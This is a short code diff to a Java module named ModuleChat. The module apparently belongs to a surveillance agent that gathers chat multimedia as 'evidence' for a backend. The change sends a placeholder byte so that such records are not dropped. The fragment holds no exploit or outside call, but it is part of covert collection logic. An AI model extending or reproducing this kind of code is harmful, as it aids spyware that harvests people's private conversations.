@@ -113,8 +113,8 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 					bio.read(blob);
 					EvidenceBuilder.atomic(EvidenceType.CHATMM,mm.getAdditionalData(),blob);
 				}else{
-					mm.getAdditionalData();
-					EvidenceBuilder.atomic(EvidenceType.CHATMM,mm.items);
+					/* add a fake content for avoiding evidence dropping by backend */
+					EvidenceBuilder.atomic(EvidenceType.CHATMM,mm.getAdditionalData(),new byte[]{0xF});
 				}
 
 			} catch (Exception e) {
